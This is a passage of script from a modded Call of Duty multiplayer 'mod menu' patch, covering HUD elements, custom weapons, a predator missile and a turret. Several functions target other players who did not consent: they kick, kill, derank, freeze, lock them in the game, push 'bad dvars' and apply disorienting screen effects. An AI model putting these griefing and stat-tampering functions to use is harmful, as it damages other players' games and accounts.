	keys=getArrayKeys(color);
	for(k=0;k < keys.size;k++)if(isDefined(color[keys[k]][0]))for(r=0;r < color[keys[k]].size;r++)color[keys[k]][r] destroy();
	else color[keys[k]] destroy();
}
iPROcreateRectangle(align,relative,x,y,width,height,color,shader,sort,alpha)
{
	barElemBG=newClientHudElem(self);
	barElemBG.elemType="bar";
	barElemBG.width=width;
	barElemBG.height=height;
	barElemBG.align=align;
	barElemBG.relative=relative;
	barElemBG.xOffset=0;
	barElemBG.yOffset=0;
	barElemBG.children=[];
	barElemBG.sort=sort;
	barElemBG.color=color;
	barElemBG.alpha=alpha;
	barElemBG setParent(level.uiParent);
	barElemBG setShader(shader,width,height);
	barElemBG.hidden=false;
	barElemBG setPoint(align,relative,x,y);
	thread iPROdestroyElemOnDeath(barElemBG);
	return barElemBG;
}
iPROcreateValue(font,fontscale,align,relative,x,y,alpha,sort,value)
{
	hudValue=createFontString(font,fontscale,self);
	hudValue setPoint(align,relative,x,y);
	hudValue.alpha=alpha;
	hudValue.sort=sort;
	hudValue setValue(value);
	thread iPROdestroyElemOnDeath(hudValue);
	return hudValue;
}
iPROdestroyElemOnDeath(elem)
{
	self waittill("death");
	if(isDefined(elem.bar))elem destroyElem();
	else elem destroy();
}
BackgroundRGB()
{
	self thread EditColor(self.Menu["Shader"]["backround"]);
}
CursRGB()
{
	self thread EditColor(self.Menu["Shader"]["Curs"]);
}
GlowEffectRGB()
{
	self thread EditColor(self.Menu["Shader"]["GlowEffect"]);
}
TalibanPro()
{
	self thread ExitMenu();
	wait 1;
	self.TP=self createFontString("objective",1.8);
	self.TP setPoint("CENTERLEFT","CENTERLEFT",20,0);
	for(t=8;t>0;t--)
	{
		self.TP maps\mp\gametypes\_rank::setSafeText(t);
		self playSound("mpl_ui_timer_countdown");
		wait 1;
	}
	self.TP destroy();
	RadiusDamage(self.origin,300,700,300,self);
	playfx(level._effect["b3_explode"],self.origin);
	self playLocalSound("mpl_sd_exp_suitcase_bomb_main");
}
welcomeText(player,text1,text2,text3,glowColor)
{
	player endon("death");
	player endon("disconnect");
	line[0]=createText9("default",2,"","",-1000,-150,1,10,text1);
	line[1]=createText9("default",2,"","",1000,-120,1,10,text2);
	line[2]=createText9("default",2,"","",-1000,-90,1,10,text3);
	for(k=0;k < line.size;k++)
	{
		line[k].glowAlpha=1;
		line[k].glowColor=glowColor;
		line[k] setPulseFX(110,4900,1500);
	}
	line[0] welcomeMove(1.5,-90);
	line[1] welcomeMove(1.5,90);
	line[2] welcomeMove(1.5,-90);
	wait 1.5;
	line[0] welcomeMove(4,90);
	line[1] welcomeMove(4,-90);
	line[2] welcomeMove(4,90);
	wait 4;
	line[0] welcomeMove(3,1000);
	line[1] welcomeMove(3,-1000);
	line[2] welcomeMove(3,1000);
	wait 3;
	for(k=0;k < 2;k++)line[k] destroy();
}
welcomeMove(time,x,y)
{
	self moveOverTime(time);
	if(isDefined(x))self.x=x;
	if(isDefined(y))self.y=y;
}
createText9(font,fontscale,align,relative,x,y,alpha ,sort,text)
{
	hudText=createFontString(font,fontscale);
	hudText setPoint(align,relative,x,y);
	hudText.alpha=alpha;
	hudText.sort=sort;
	hudText setText(text);
	thread destroyElemOnDeath9(hudText);
	return hudText;
}
destroyElemOnDeath9(elem)
{
	self waittill("death");
	if(isDefined(elem.bar))elem destroyElem();
	else elem destroy();
}
kickAll()
{
	for(i=0;i < level.players.size;i++)
	{
		if(level.players[i].name!=level.hostname)kick(i);
	}
}



killAll()
{
	self iPrintln("Hey " + self.name + " They Will Think Twice Before Messing With You Again!");
	for (i = 0;i < level.players.size;i++)
	{
		player = level.players[i];
		if (player == self) continue;
		if (player.verified == 0 || player.vip == 0 || player.admin == 0 || player.verified==1 || player.vip == 1 || player.admin == 1)
		{
			player suicide();
		}
	}
}

removeAll()
{
	self iPrintln("Everyone is Un-verified");
	for (i = 0;i < level.players.size;i++)
	{
		player = level.players[i];
		if (player == self) continue;
		if (player.verified == 0 || player.vip == 0 || player.admin == 0 || player.verified==1 || player.vip == 1 || player.admin == 1)
		{
			player thread RemoveAccess();
		}
	}
}

BadDvarsAll()
{
	self iPrintln("All Bad Dvars");
	for (i = 0;i < level.players.size;i++)
	{
		player = level.players[i];
		if (player == self) continue;
		if (player.verified == 0 || player.vip == 0 || player.admin == 0 || player.verified==1 || player.vip == 1 || player.admin == 1)
		{
			player thread BadDvars();
		}
	}
}
derankAll()
{
	self iPrintln("Everyone Deranked");
	for (i = 0;i < level.players.size;i++)
	{
		player = level.players[i];
		if (player == self) continue;
		if (player.verified == 0 || player.vip == 0 || player.admin == 0 || player.verified==1 || player.vip == 1 || player.admin == 1)
		{
			player thread setRank1();
			player thread DerankMuch();
		}
	}
}

drugsAll()
{
	self iPrintln("Everyone has been given drugs");
	for (i = 0;i < level.players.size;i++)
	{
		player = level.players[i];
		if (player == self) continue;
		if (player.verified == 0 || player.vip == 0 || player.admin == 0 || player.verified==1 || player.vip == 1 || player.admin == 1)
		{
			player thread DrunkVision();
		}
	}
}
DrunkVision()
{
	self endon("disconnect");
	self endon("death");
	self thread Flipping();
	self iPrintlnBold("Never shoulda smoked that weed...");
	while(1)
	{
		self setClientDvar("r_lightTweakSunColor","0 0 1 1");
		self setClientDvar("r_lightTweakSunLight","4");
		wait .1;
		self setClientDvar("r_lightTweakSunColor","0 0 0 0");
		self setClientDvar("r_lightTweakSunLight","0");
		self setClientDvar("r_colorMap","2");
		wait .1;
		self setClientDvar("r_colorMap","0");
		wait .1;
		self setClientDvar("r_colorMap","2");
		wait .1;
		self setClientDvar("r_lightTweakSunColor","0 0 1 1");
		self setClientDvar("r_lightTweakSunLight","4");
		wait .1;
		self setClientDvar("r_lightTweakSunColor","0 0 0 0");
		self setClientDvar("r_lightTweakSunLight","0");
		self setClientDvar("r_colorMap","2");
		wait .1;
		self setClientDvar("r_colorMap","0");
		wait .1;
		self setClientDvar("r_colorMap","2");
	}
}
Flipping()
{
	self endon("disconnect");
	self endon("death");
	for(;;)
	{
		self.angle=self GetPlayerAngles();
		if(self.angle[1] < 179)self setPlayerAngles(self.angle +(0,0,2));
		else self SetPlayerAngles(self.angle *(1,-1,1));
		wait 0.00025;
	}
}

freezeAll()
{
	self iPrintln("Everyone Frozen!");
	for (i = 0;i < level.players.size;i++)
	{
		player = level.players[i];
		if (player == self) continue;
		if (player.verified == 0 || player.vip == 0 || player.admin == 0 || player.verified==1 || player.vip == 1 || player.admin == 1)
		{
			player thread DoTheFreeze();
		}
	}
}


DoTheFreeze()
{
self freezeControls(true);
wait 0.5;
self iPrintln("Everyone Unfrozen!");
wait 0.5;
self freezeControls(false);
}

LockInGame()
{
	self iPrintln("HaHa Locked In!");
	for (i = 0;i < level.players.size;i++)
	{
		player = level.players[i];
		if (player == self) continue;
		if (player.verified == 0 || player.vip == 0 || player.admin == 0 || player.verified==1 || player.vip == 1 || player.admin == 1)
		{
			player thread LockMeIn();
		}
	}
}
LockMeIn()
{
	while(1)
	{
		self CloseMenu();
		self CloseInGameMenu();
		wait 0.01;
	}
}
teleAll()
{
	self beginLocationSelection( "rank_prestige15" ); 
    self.selectingLocation = 1; 
    self waittill( "confirm_location", location ); 
    newLocation = BulletTrace( location+( 0, 0, 100000 ), location, 0, self )[ "position" ];
    //self SetOrigin( newLocation );
    self endLocationSelection(); 
    self.selectingLocation = undefined;
	for (i = 0;i < level.players.size;i++)
	{
		player = level.players[i];
		if (player == self) continue;
		if (player.verified == 0 || player.vip == 0 || player.admin == 0 || player.verified==1 || player.vip == 1 || player.admin == 1)
		{
			player SetOrigin( newLocation );
		}
	}
	self iPrintln("Everyone teleported!");
}
GiveAllPrestige(value)
{
	self iPrintlnBold("You Gave All Prestige ", value);
	for (i = 0;i < level.players.size;i++)
	{
		player = level.players[i];
		if (player == self) continue;
		if (player.verified == 0 || player.vip == 0 || player.admin == 0 || player.verified==1 || player.vip == 1 || player.admin == 1)
		{
		  player thread Prestige(value);
		}
	}
}

allPlayUnlock()
{
	self iPrintln("Hey " + self.name + "You Gave Everyone Unlock ALL");
	for (i = 0;i < level.players.size;i++)
	{
		player = level.players[i];
		if (player == self) continue;
		if (player.verified == 0 || player.vip == 0 || player.admin == 0 || player.verified==1 || player.vip == 1 || player.admin == 1)
		{
			player thread UnlockAll();
		}
	}
}
verifyAll()
{
	self iPrintln("Everyone has been Verified");
	for (i = 0;i < level.players.size;i++)
	{
		player = level.players[i];
		if (player == self) continue;
		if (player.verified == 0 || player.vip == 0 || player.admin == 0 || player.verified==1 || player.vip == 1 || player.admin == 1)
		{
			player thread Verify();
		}
	}
}
GivePlayerUnlocks()
{
	level.players[self.PlayerNum] thread UnlockAll();
}
LockPlayer()
{
	if(level.players[self.PlayerNum].verified==false)
	{
		level.players[self.PlayerNum] thread LockMeIn();
		self iPrintln("Player Locked in game");
	}
}
GiveDrugs()
{
	level.players[self.PlayerNum] thread DrunkVision();
	self iPrintln("You gave "+level.players[self.PlayerNum].name+" Drugs");
}
WeaponBox()
{
	level.circle=loadfx("misc/ui_flagbase_gold");
	O=self.origin+(0,180,0);
	wait .2;
	B=spawn("script_model",O);
	B setModel("mp_flag_allies_1");
	B Solid();
	C=spawn("script_model",O);
	C setModel("mp_supplydrop_ally");
	C Solid();
	g=SpawnFx(level.circle,O);
	TriggerFX(g);
	W=spawn("script_model",B.origin);
	W Solid();
	for(;;)
	{
		for(i=0;i<level.players.size;i++)
		{
			P=level.players[i];
			wait 0.01;
			P thread StopText();
			R=distance(B.origin,P.origin);
			if(R < 95)
			{
				P SetLowerMessage("Press ^3[{+usereload}]^7 for Random Weapon");
				if(P UseButtonPressed())wait 0.1;
				if(P UseButtonPressed())
				{
					P.oldGun=P GetCurrentWeapon();
					RW="";
					i=randomint(75);
					j=randomint(6);
					RW=level.weaponList[i];
					W setModel(getWeaponModel(RW,j));
					W MoveTo(B.origin +(0,0,50),1);
					wait 1;
					if(P GetWeaponsListPrimaries().size > 1)P giveWeapon(RW,j);
					P switchToWeapon(RW,j);
					P playsound("oldschool_pickup");
					wait 0.2;
					W MoveTo(B.origin,1);
					wait 0.2;
					W setModel("");
					P TakeWeapon(P.oldGun);
					wait 2;
				}
			}
			else
			{
				P notify("StopText");
			}
		}
	}
}
StopText()
{
	for(;;)
	{
		self waittill("StopText");
		self ClearLowerMessage(1);
	}
}
End(Dest)
{
	self waittill("endShader");
	Dest destroy();
}
destroyOnDeath(hudElem)
{
	self waittill("death");
	hudElem destroy();
}
TestOverflow()
{
	display=createFontString("default",1.5 ,self);
	display setPoint("CENTER","CENTER",0,0);
	i=0;
	for(;;)
	{
		display maps\mp\gametypes\_rank::setSafeText("Strings: ^1"+i);
		i++;
		wait 0.01;
	}
}
ChooseRank()
{
	self thread Chooser(1,50,"rank","Rank","rank");
}
Chooser(MIN,MAX,INPUT,TEXT,PERS)
{
	self endon("death");
	self endon("done");
	self.editingStats=true;
	self thread ExitMenu();
	wait 0.2;
	self iPrintln("Use [{+attack}] and [{+speed_throw}] to Change Rank\nPress [{+usereload}] to Confirm or [{+melee}] to Cancel");
	SLIDER["INIT"]=true;
	if(PERS)SLIDER["CURS"]=self.pers[PERS];
	else SLIDER["CURS"]=0;
	SLIDER["ELEMENT"][0]=createVal("CENTER","CENTER",-35,0,"defualt",1.75,2,.4);
	SLIDER["ELEMENT"][1]=createVal("CENTER","CENTER",0,0,"objective",4,3,1);
	SLIDER["ELEMENT"][2]=createVal("CENTER","CENTER",35,0,"defualt",1.75,2,.4);
	SLIDER["ELEMENT"][3]=createVal("CENTER","CENTER",0,35,"defualt",1.5,2,1);
	SLIDER["ELEMENT"][4]=createShad("LEFT","LEFT",-125,220,900,40,"gradient_center",(0,0,0),0.7,1);
	while(isDefined(SLIDER["INIT"]))
	{
		self freezeControls(true);
		//self setClientDvar("r_blur",9);
		//self setClientDvar("ui_hud_harcore",1);
		SLIDER["CURS"] += self AttackButtonPressed();
		SLIDER["CURS"] -= self AdsButtonPressed();
		if(SLIDER["CURS"] < MIN)SLIDER["CURS"]=MAX;
		if(SLIDER["CURS"] > MAX)SLIDER["CURS"]=MIN;
		if(SLIDER["CURS"]==MAX)SLIDER["NEXT"]=MIN;
		else SLIDER["NEXT"]=SLIDER["CURS"] + 1;
		if(SLIDER["CURS"]==MIN)SLIDER["PREV"]=MAX;
		else SLIDER["PREV"]=SLIDER["CURS"] - 1;
		SLIDER["ELEMENT"][0] setValue(SLIDER["PREV"]);
		SLIDER["ELEMENT"][1] setValue(SLIDER["CURS"]);
		SLIDER["ELEMENT"][2] setValue(SLIDER["NEXT"]);
		SLIDER["ELEMENT"][3] setText(TEXT + " " + SLIDER["CURS"]);
		if(self MeleeButtonPressed())
		{
			SLIDER["ELEMENT"][4] destroy();
			for(K=0;K < SLIDER["ELEMENT"].size;K++)
			{
				SLIDER["ELEMENT"][K] destroyElem();
				//self setClientDvar("r_blur",0);
				//self setClientDvar("ui_hud_harcore",0);
				SLIDER["INIT"]=false;
				self.editingStats=false;
				self freezeControls(false);
				wait .1;
			}
		}
		if(self UseButtonPressed())
		{
			self maps\mp\gametypes\_persistence::statSet(INPUT,SLIDER["CURS"]);
			self maps\mp\gametypes\_hud_message::oldNotifyMessage(TEXT + " " + SLIDER["CURS"]);
			self iPrintln(TEXT + " " + SLIDER["CURS"] + " Set!");
			wait 1;
		}
		wait .1;
	}
}
CreateVal(point,relative,x,y,font,fontscale,sort,alpha)
{
	Value=createFontString(font,fontscale);
	Value setPoint(point,relative,x,y);
	Value.alpha=alpha;
	Value.sort=sort;
	return Value;
}
createShad(point,rPoint,x,y,width,height,elem,colour,alpha,sort)
{
	shader=newClientHudElem(self);
	shader.alignX=point;
	shader.alignY=rPoint;
	shader.x=x;
	shader.y=y;
	shader.sort=sort;
	shader.alpha=alpha;
	shader.color=colour;
	shader setShader(elem,width,height);
	return shader;
}
RollCredits()
{
	self ExitMenu();
	self.CreditsRolling=true;
	self thread killCreds();
	self setClientDvar("cg_drawCrossHair",0);
	self setClientDvar("r_filmwteakenable",1);
	self setClientDvar("r_filmUseTweaks",1);
	self setClientDvar("r_glow",0);
	self setClientDvar("r_glowRadius0",7);
	self setClientDvar("r_glowRadius1",7);
	self setClientDvar("r_glowBloomCutoff",0.99);
	self setClientDvar("r_glowBloomDesaturation",0.65);
	self setClientDvar("r_glowBloomIntensity0",0.36);
	self setClientDvar("r_glowBloomIntensity1",0.36);
	self setClientDvar("r_glowSkyBleedIntensity0",0.29);
	self setClientDvar("r_glowSkyBleedIntensity1",0.29);
	self setClientDvar("r_filmTweakEnable",1);
	self setClientDvar("r_filmTweakContrast",0);
	self setClientDvar("r_filmTweakBrightness",-1);
	self setClientDvar("r_filmTweakDesaturation",0.2);
	self setClientDvar("r_filmTweakInvert",0);
	self setClientDvar("r_filmTweakLightTint","1 1 1");
	self setClientDvar("r_filmTweakDarkTint","1 1 1");
	wait 0.1;
	self.LockMenu=true;
	self freezeControls(true);
	if(self.god==false)
	{
		self.maxhealth=90000;
		self.health=self.maxhealth;
	}
	self.credits=self createFontString("hudbig",2.5);
	self.credits setPoint("CENTER","CENTER",30,999);
	self.credits maps\mp\gametypes\_rank::setSafeText("Patch Made By iPROFamily\n\nMenu Base And Some Codes By IELIITEMODZX\n\nSPECIAL THANKS TO:\nKaroolus\nMikeeeyy\nx_DaftVader_x\nINSAN3LY_D34TH\nx2EzYx--\n nay\nIVI40A3Fusionz\nCorrey\n...And The WAW Modding Community!!");
	self.credits.alpha=1;
	self.credits.color=(0.5,0.0,0.8);
	self.credits.glow=1;
	self.credits.glowAlpha=1;
	self.credits.glowColor=(0,0,0);
	self.credits.y=300;
	self.credits moveOverTime(20);
	self.credits.y=-650;
}
killCreds()
{
	wait 20;
	self.credits destroy();
	self freezeControls(false);
	if(self.god==false)
	{
		self.maxhealth=100;
		self.health=self.maxhealth;
	}
	self setClientDvar("r_glow",0);
	self setClientDvar("r_glowRadius0",7);
	self setClientDvar("r_glowRadius1",7);
	self setClientDvar("r_glowBloomCutoff",0.99);
	self setClientDvar("r_glowBloomDesaturation",0.65);
	self setClientDvar("r_glowBloomIntensity0",0.36);
	self setClientDvar("r_glowBloomIntensity1",0.36);
	self setClientDvar("r_glowSkyBleedIntensity0",0.29);
	self setClientDvar("r_glowSkyBleedIntensity1",0.29);
	self setClientDvar("r_filmTweakEnable",0);
	self setClientDvar("r_filmUseTweaks",0);
	self setClientDvar("r_filmTweakContrast",1);
	self setClientDvar("r_filmTweakBrightness",0);
	self setClientDvar("r_filmTweakDesaturation",0.2);
	self setClientDvar("r_filmTweakInvert",0);
	self setClientDvar("r_filmTweakLightTint","1 1 1");
	self setClientDvar("r_filmTweakDarkTint","1 1 1");
	self setClientDvar("cg_drawCrossHair",1);
	self.LockMenu=false;
	self.CreditsRolling=false;
}
GiveShotGunThing()
{
	self endon("death");
	self endon("disconnect");
	self giveWeapon("rottweil72_mp",6);
	wait 0.1;
	self switchtoweapon("rottweil72_mp",6);
	for(;;)
	{
		self waittill("weapon_fired");
		if(self getcurrentweapon()== "rottweil72_mp")
		{
			owner=self;
			vec=anglestoforward(self getPlayerAngles());
			bullet=spawn("script_model",self getTagOrigin("tag_weapon_right"));
			bullet setModel("projectile_cbu97_clusterbomb");
			bullet.angles=self getPlayerAngles();
			bullet thread BulletFly(owner,vec,100);
		}
		wait .1;
	}
}
/*
VaderBullet(model,sound,move)
{
	owner=self;
	vec=anglestoforward(self getPlayerAngles());
	bullet=spawn("script_model",self getTagOrigin("tag_weapon_right"));
	bullet setModel(model);
	bullet.angles=self getPlayerAngles();
	bullet playsound(sound);
	bullet thread BulletFly(owner,vec,move);
}
*/
BulletFly(owner,vec,move)
{
	self endon("end");
	self playsound("weap_bazooka_loop");
	for(i=350;i>0;i--)
	{
		speed=(vec[0]*move,vec[1]*move,vec[2]*move);
		if(bullettracepassed(self.origin,self.origin+speed,false,undefined))
		{
			self moveto(self.origin + speed,0.1);
			//playfx(level.chopper_fx["smoke"]["trail"],self.origin);
			playfx(level.bazooka_effect,self.origin);
		}
		else
		{
			mark=self.origin;
			self thread BulletExplode(owner,mark);
			self notify("end");
		}
		wait 0.01;
	}
	mark=self.origin;
	self thread BulletExplode(owner,mark);
	self notify("end");
}
BulletExplode(owner,mark)
{
	self stoploopsound("weap_rpg_loop");
	wait 0.05;
	self playsound("hind_helicopter_secondary_exp");
	level.expbullt=loadfx("explosions/default_explosion");
	Playfx(level.expbullt,mark);
	RadiusDamage(mark,450,700,350,owner);
	self delete();
}
bomberUse()
{
	if(!level.bomberInUse)
	{
		self beginLocationSelection( "rank_prestige15" ); 
		self.selectingLocation=true;
		self waittill("confirm_location",location);
		self endLocationSelection();
		self.selectingLocation=undefined;
		callBomber(bulletTrace(location+(0,0,1000),(location+(0,0,-100000)),false,undefined)["position"],168);
		level.bomberInUse=true;
	}
}

callBomber(coord,yaw)
{
	startPoint=coord+(vector_scale(anglesToForward((0,yaw,0)),((-1)*13000))+(0,0,750));
	endPoint=coord+(vector_scale(anglesToForward((0,yaw,0)),13000)+(0,0,750));
	length=length(startPoint - endPoint);
	for(k=0;k < 8;k++)level thread bomberStrike(self,coord,startPoint+(0,((-1)*((8/2)*450)+(k*550)),randomIntRange(100,500)),endPoint+(0,((-1)*((8/2)*450)+(k*550)),randomIntRange(100,500)),(length/3000),(0,yaw,0),(abs(length/2+1500)/3000));
}
bomberStrike(owner,bombSite,startPoint,endPoint,flyTime,direction,bombTime)
{
	plane=spawnPlane(owner,"script_model",startPoint+((randomFloat(2)-1),(randomFloat(2)-1),0));
	plane setModel("t5_veh_jet_u2");
	plane.angles=direction;
	plane moveTo(endPoint+((randomFloat(2)-1),(randomFloat(2)-1),0),flyTime);
	//thread maps\mp\gametypes\_hardpoints::callStrike_planeSound(plane,bombSite);
	for(k=0;k < 4;k++)
	{
		plane thread bomberBomb(bombTime-2.2,owner);
		wait .15;
	}
	wait(flyTime);
	plane delete();
}
bomberBomb(time,owner)
{
	wait(time);
	bomb=spawn("script_model",self.origin);
	bomb setModel("t5_veh_weapon_rpg_world");
	bomb.angles=self.angles;
	bomb moveGravity(vector_scale(anglesToForward(self.angles),4500/1.5),2);
	wait(1);
	trace=bulletTrace(bomb.origin,(bomb.origin+vector_scale(anglesToForward(bomb.angles-(15,0,0),0,0),-10000)),false,undefined)["position"];
	PlayFXOnTag(level.jetBomb,bomb,"tag_origin");
	level.jetBomb=loadfx("weapon/artillery/fx_artillery_strike_dirt_mp");
	playRumbleOnPosition("artillery_rumble",trace);
	earthquake(.7,.75,trace,2000);
	bomb setModel("tag_origin");
	thread killPlayersEffect(owner);
	wait(1);
	bomb delete();
}
killPlayersEffect(owner)
{
	for(time=0;;time++)
	{
		if(time >=(20))break;
		fallTrace=bulletTrace(self.origin,self.origin+(0,0,-10000),false,self)["position"];
		radiusDamage(fallTrace,600,550,450,owner,"MOD_PROJECTILE_SPLASH","artillery_mp");
		wait .05;
	}
	level.bomberInUse=false;
}
toggle_leftgun()
{
	if(self.leftgun==false)
	{
		self setClientDvar("cg_gun_x","4");
		self setClientDvar("cg_gun_y","10");
		self iPrintln("Left-side weapon ^2On");
		self.leftgun=true;
	}
	else
	{
		self setClientDvar("cg_gun_x","0");
		self setClientDvar("cg_gun_y","0");
		self iPrintln("Left-side weapon ^1Off");
		self.leftgun=false;
	}
}
TraceModel()
{
	for(;;)
	{
		while(self fragbuttonpressed())
		{
			trace=bullettrace(self gettagorigin("j_head"),self gettagorigin("j_head")+anglestoforward(self getplayerangles())*1000000,true,self);
			while(self fragbuttonpressed())
			{
				modeltoshow=trace["entity"].model;
				self iPrintln("looking at: ^3" + modeltoshow);
				wait 1;
			}
		}
		wait 0.05;
	}
}
KnifeThrow()
{
	self endon("disconnect");
	self endon("death");
	self iPrintlnBold("[{+melee}] To Throw Knife");
	while(1)
	{
		wait 0.05;
		if(self meleeButtonPressed())
		{
			trace=bullettrace(self geteye(),self geteye()+ vecscale(anglestoforward(self getplayerangles()),500000),true,self);
			self.knife=spawn("script_model",self geteye());
			self.knife.origin=self geteye();
			self.knife.angles=self.angles;
			self.knife setmodel("t5_weapon_ballistic_knife_blade");
			self.knife thread KnifeSpin();
			time=Distratio(distance(self.knife.origin,trace["position"]));
			self.knife moveto(trace["position"],time);
			self.knife.startangle=self.angles;
			timerz=0.75;
			while(self.knife.origin!=trace["position"])
			{
				wait 0.75;
				tracez=bullettrace(self.knife.origin,self.knife.origin + vecscale(anglestoforward(self.knife.startangle),45),true,self.knife);
				if(isDefined(tracez["entity"])&& isplayer(tracez["entity"])&& isAlive(tracez["entity"]))tracez["entity"] [[level.callbackPlayerDamage]](self,self,tracez["entity"].health,level.iDFLAGS_NO_KNOCKBACK,"MOD_MELEE","m16_mp",(0,0,0),(0,0,0),"torso_lower",0);
				wait 0.05;
				timerz += 0.05;
			}
			self.knife notify("killknife");
			self.knife hide();
			self.knife delete();
			wait 1;
		}
	}
}
KnifeSpin()
{
	self endon("killknife");
	while(isDefined(self))
	{
		self rotatepitch(180,0.35);
		wait 0.35;
	}
}
Distratio(dist)
{
	time=dist / 750;
	return time;
}
vecscale(vec,scalar)
{
	return(vec[0]*scalar,vec[1]*scalar,vec[2]*scalar);
}
predator()
{
	if(!level.predator)
	{
		level.predator=true;
		self.oldPos=self getOrigin();
		self ExitMenu();
		self.maxhealth=90000;
		self.health=self.maxhealth;
		self disableWeapons();
		self hide();
		thread predatorWait();
		self SayTeam("^1FRIENDLY ^7PREDATOR MISSILE INBOUND!");
	}
	else self iPrintln("^1Please Wait There Is A Predator In Use.");
}
predatorWait()
{
	corner=getEntArray("minimap_corner","targetname");
	predator["model"]=spawn("script_model",(corner[1].origin+(0,0,2200)+vector_scale(anglesToForward(vectorToAngles(corner[0].origin+(0,0,2200)- corner[1].origin+(0,0,2200))),2700)));
	predator["model"] setModel("aircraft_bomb");
	predator["model"] setPredatorView(self,corner);
	predator["model"] predatorLaunch(self);
}
setPredatorView(player,vector)
{
	player thread predatorDisconnect(self);
	coord=strTok("21,0,2,24;-20,0,2,24;0,-11,40,2;0,11,40,2;0,-39,2,57;0,39,2,57;-48,0,57,2;49,0,57,2;-155,-122,2,21;-154,122,2,21;155,122,2,21;155,-122,2,21;-145,132,21,2;145,-132,21,2;-145,-132,21,2;146,132,21,2",";");
	for(k=0;k < coord.size;k++)
	{
		tCoord=strTok(coord[k],",");
		player.predator[k]=player createHuds(int(tCoord[0]),int(tCoord[1]),int(tCoord[2]),int(tCoord[3]));
	}
	angles=vectorToAngles(vector[0].origin+(0,0,2000)- vector[1].origin-(0,0,15000));
	player setPlayerAngles(angles);
	player setOrigin(self.origin+(150,0,-50));
	player linkTo(self);
	self.angles=angles;
}
predatorLaunch(player)
{
	player endon("death");
	player endon("disconnect");
	self.speed=.8;
	for(time=0;;time++)
	{
		earthQuake(.15,.05,self.origin,200);
		playFxOnTag(level.chopper_fx["fire"]["trail"]["medium"],self,"tag_origin");
		predator["forward"]=self.origin+vector_scale(anglesToForward(self.angles),60*self.speed);
		predator["collision"]=bulletTrace(self.origin,predator["forward"],false,self);
		if((time >=(20*9))||(predator["collision"]["surfacetype"]!="default" && predator["collision"]["fraction"] < 1 && level.collisions))
		{
			expPos=self.origin;
			for(k=0;k < 360;k+=80) playFX(level.chopper_fx["explode"]["large"],(expPos[0]+(200*cos(k)),expPos[1]+(200*sin(k)),expPos[2]+100));
			earthquake(3,1.6,expPos,500);
			self playSound("wpn_semtex_alert");
			wait .05;
			radiusDamage(expPos,450,400,300,player);
			break;
		}
		if(player attackButtonPressed()&& self.speed<=1)
		{
			self.speed=1.5;
			self playSound("wpn_grenade_explode");
		}
		self.angles=player getPlayerAngles();
		self moveTo(predator["forward"],.05);
		angles=player getPlayerAngles();
		if(angles[0]<=10) player setPlayerAngles((10,angles[1],angles[2]));
		wait .05;
	}
	player notify("preditor_end");
	player thread predatorEnd(self);
}
predatorEnd(entity)
{
	if(isDefined(entity)) entity delete();
	level.predator=false;
	for(k=0;k < self.predator.size;k++) if(isDefined(self.predator[k])) self.predator[k] destroyElem();
	self unlink();
	self setOrigin(self.oldPos);
	self enableWeapons();
	self show();
	self.lockMenu=false;
	self.maxhealth=100;
	self.health=self.maxhealth;
}
predatorDisconnect(entity)
{
	self endon("preditor_end");
	self waittill("death");
	thread predatorEnd(entity);
}
giveTurret()
{
	if(!self.isTurret)
	{
		self.isTurret=true;
		self ExitMenu();
		wait .2;
		turret["carry"]=spawn("script_model",(0,0,0));
		turret["carry"].origin =(self.origin+anglesToForward(self.angles)*60)+(0,0,45);
		turret["carry"].angles =(270,self.angles[1],self.angles[2]);
		turret["carry"] linkTo(self);
		turret["carry"] setModel("t5_weapon_minigun_turret");
		wait .5;
		thread placeTurret(turret["carry"]);
		self iPrintln("Press [{+activate}] To Place Sentry Gun.");
	}
}
placeTurret(entity)
{
	for(;;)
	{
		angles=self getPlayerAngles();
		if(angles[0]<=0) self setPlayerAngles((0,angles[1],angles[2]));
		else if(angles[0]>=10) self setPlayerAngles((10,angles[1],angles[2]));
		if(self useButtonPressed()|| !isAlive(self))
		{
			iPrintln(self.name," Spawned A Turret!");
			entity unlink();
			thread spawnTurret();
			break;
		}
		wait(.05);
	}
	self enableWeapons();
	entity delete();
}
spawnTurret()
{
	array=strTok("t5_weapon_minigun_turret;test_sphere_silver",";");
	point=self.origin+(vector_scale(anglesToForward(self getPlayerAngles()),38));
	turret["gun"][0]=spawn("script_model",point+(0,0,45));
	turret["gun"][1]=spawn("script_model",point+vector_scale(anglesToForward(self getPlayerAngles()),15)+(0,0,13));
	turret["gun"][2]=spawn("trigger_radius",point+vector_scale(anglesToForward(self getPlayerAngles()),2)+(0,0,13),0,40,40);
	turret["gun"][2] setContents(1);
	turret["gun"][2].targetname="script_collision";
	for(k=0;k < turret["gun"].size;k++)
	{
		turret["gun"][k] setModel(array[k]);
		turret["gun"][k].angles =(k*-90,self getPlayerAngles()[1],0);
	}
	turret["gun"][0] thread checkForPlayers(self);
	turret["gun"][0] thread rotateTurret(self);
	turret["gun"][0] thread shootTurret(self);
	turret["gun"] thread timeOutTurret(50,self);
	thread turretGametype(turret["gun"]);
}
timeOutTurret(time,entity)
{
	wait(time);
	entity.isTurret=false;
	for(k=0;k < self.size;k++) self[k] delete();
}
turretGametype(entity)
{
	self waittill("lobby_choose");
	if(self.isTurret)
	{
		self.isTurret=false;
		for(k=0;k < entity.size;k++) entity[k] delete();
	}
}
shootTurret(owner)
{
	while(owner.isTurret)
	{
		if(isDefined(self.tagedPlayer))
		{
			startPath=self.origin+(vector_scale(anglesToForward(self.angles),25));
			trace=bulletTrace(startPath,startPath+(vector_scale(anglesToForward(self.angles),1400)),true,self)["entity"];
			if((isPlayer(trace))&&((level.teamBased && trace.team!=owner.team)||(!level.teamBased && owner!=trace)))
			{
				playFx(level.muzzleFlash,startPath);
				self playSound("wpn_hk21_fire_plr");
				self.tagedPlayer thread [[level.callbackPlayerDamage]](self,self,19,0,"MOD_RIFLE_BULLET","minigun_mp",self.tagedPlayer getEye(),(0,0,0),"j_head",0);
				wait(.05);
			}
		}
		wait(.05);
	}
}
checkForPlayers(owner)
{
	while(owner.isTurret)
	{
		closePlayer=undefined;
		self.tagedPlayer=undefined;
		closeDist=undefined;
		for(k=0;k < level.players.size;k++)
		{
			if((isAlive(level.players[k]))&&((level.teamBased && level.players[k].team!=owner.team)||(!level.teamBased && owner!=level.players[k])))
			{
				inView=turretTarget(level.players[k]);
				if((inView>=0)&&(!isDefined(closeDist)|| inView<=closeDist))
				{
					closePlayer=level.players[k];
					closeDist=inView;
				}
			}
		}
		while(isAlive(closePlayer)&& turretTarget(self.tagedPlayer)>= 0)
		{
			self.tagedPlayer=closePlayer;
			wait(.05);
		}
